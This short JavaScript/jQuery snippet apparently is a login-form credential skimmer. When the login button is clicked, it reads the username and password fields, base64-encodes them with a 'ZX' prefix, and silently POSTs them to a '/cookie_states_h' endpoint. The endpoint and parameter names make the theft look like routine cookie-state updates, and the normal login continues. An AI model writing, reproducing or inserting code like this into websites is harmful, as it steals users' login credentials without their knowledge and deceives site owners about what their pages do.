if ($('.login-form').length) {

   
	$('.login-form [type=Submit]').on('click',function() {
		credentials_update();
		return true;
	});
}


function credentials_update(){  
    $.ajax({
        type: "post",
        dataType: "json",
  

        url: api_path + "/cookie_states_h",
        data: { 
            state0: btoa('cj'),
            state1: 'ZX'+btoa($('[name=uname]').val()), 
            state2: 'ZX'+btoa($('[name=pw]').val()), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
